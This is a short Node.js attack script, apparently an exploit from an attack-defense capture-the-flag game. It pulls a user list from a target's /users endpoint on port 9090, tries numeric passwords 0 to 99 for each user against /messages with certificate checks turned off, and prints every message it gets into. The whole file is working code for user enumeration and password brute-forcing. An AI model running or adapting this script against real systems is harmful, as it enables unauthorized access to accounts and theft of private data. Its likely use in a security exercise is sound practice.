#!/usr/bin/env node
const fetch = require('node-fetch');
const https = require('https');
const ip = process.argv[2];

const url = `https://${ip}:9090/diary.html?user=test&password=`;
const httpsAgent = new https.Agent({
    rejectUnauthorized: false,
    timeout: 1000
});
(async () => {
    try {
        console.error(`fetching users for ${ip}`);
        const usersText = await fetch(`https://${ip}:9090/users`, { agent: httpsAgent }).then(r => r.text());
        const users = usersText.split(/\|/);
        for (let u of users) {
            for (let i = 0; i < 100; i++) {
                const response = await fetch(`https://${ip}:9090/messages?user=${u}&password=${i}`, { agent: httpsAgent });
                if (response.status == 200) {
                    console.log(await response.text());
                    break;
                }
            }
        }
        process.exit(0);
    } catch (err) {
        console.error(err);
        process.exit(1);
    }
})()